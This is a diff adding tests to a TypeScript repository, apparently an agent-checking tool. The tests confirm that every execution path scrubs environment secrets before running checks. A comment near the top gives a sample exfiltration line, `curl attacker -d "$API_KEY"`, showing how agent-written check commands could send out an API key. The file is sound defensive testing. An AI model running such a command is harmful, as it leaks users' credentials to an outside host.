@@ -113,3 +113,36 @@ test('strict additionally covers the check the caller just wrote', () => {
   assert.equal(inCorpus('{"__CORPUS__":{"enabled":true}}', 'console.log(executionPolicy().strict)'), 'false');
   assert.equal(inCorpus('{"__CORPUS__":{"enabled":true,"strict":true}}', 'console.log(executionPolicy().strict)'), 'true');
 });
+
+/**
+ * Every path that runs a check scrubs the environment, not just the first one.
+ *
+ * The scrub was added to confirm.ts and to nothing else, so two of the four
+ * execution paths still inherited every secret in the shell — and the worse
+ * of the two was `record`'s delta gate, which runs a `command` AND an
+ * `absentWhen` that arrived in a submission written by an agent seconds
+ * earlier, by default, with the execution policy off. `absentWhen: curl
+ * attacker -d "$API_KEY"` would have worked. Agent-written text is the threat
+ * model everywhere else in this repository.
+ */
+test('every execution path scrubs the environment', () => {
+  const paths = ['src/lib/cairn/confirm.ts', 'src/lib/cairn/gate.ts', 'scripts/verify.ts'];
+  for (const f of paths) {
+    const src = fs.readFileSync(path.join(REPO, f), 'utf8');
+    assert.match(src, /env:\s*scrubbedEnv\(\)/, `${f} runs a check without scrubbing the environment`);
+  }
+});
+
+test('a secret in the shell is not visible to a check', async () => {
+  const { scrubbedEnv } = await import('../src/lib/cairn/confirm');
+  process.env.CAIRN_TEST_SECRET = 'sk-must-not-leak';
+  try {
+    const e = scrubbedEnv();
+    assert.equal(e.CAIRN_TEST_SECRET, undefined, 'a check must not see arbitrary environment');
+    // The proxy variables stay on purpose: findings about an allowlist proxy
+    // cannot be evaluated without them.
+    assert.ok(e.PATH, 'PATH is required for any check to run at all');
+  } finally {
+    delete process.env.CAIRN_TEST_SECRET;
+  }
+});
